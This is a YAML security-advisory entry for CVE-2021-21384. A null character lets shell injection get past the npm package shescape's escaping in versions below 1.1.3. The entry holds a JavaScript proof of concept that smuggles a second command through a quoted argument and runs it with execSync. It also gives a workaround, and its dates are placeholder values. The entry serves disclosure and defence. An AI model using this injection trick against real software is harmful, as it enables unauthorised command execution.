---
- id: npmjs:npm:shescape:1655
  title: Command Injection
  description: "### Impact\n\nAnyone using `shescape` to defend against shell injection
    may still be vulnerable against shell injection if the attacker manages to insert
    a [null character](https://en.wikipedia.org/wiki/Null_character) into the payload.
    For example (on Windows):\n\n```javascript\nconst cp = require(\"child_process\");\nconst
    shescape = require(\"shescape\");\n\nconst nullChar = String.fromCharCode(0);\nconst
    payload = \"foo\\\" && ls -al ${nullChar} && echo \\\"bar\";\nconsole.log(cp.execSync(`echo
    ${shescape.quote(payload)}`));\n// foototal 3\n// drwxr-xr-x 1 owner XXXXXX      0
    Mar 13 18:44 .\n// drwxr-xr-x 1 owner XXXXXX      0 Mar 13 00:09 ..\n// drwxr-xr-x
    1 owner XXXXXX      0 Mar 13 18:42 folder                                                                 \n//
    -rw-r--r-- 1 owner XXXXXX      0 Mar 13 18:42 file\n```\n\n### Workarounds\n\nAlternatively,
    null characters can be stripped out manually using e.g. `arg.replace(/\\u{0}/gu,
    \"\")`"
  affected_package: shescape
  vulnerable_versions:
  - "<1.1.3"
  severity: medium
  package_manager: npm
  cve:
  - CVE-2021-21384
  cwe: CWE-88
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Anonymous
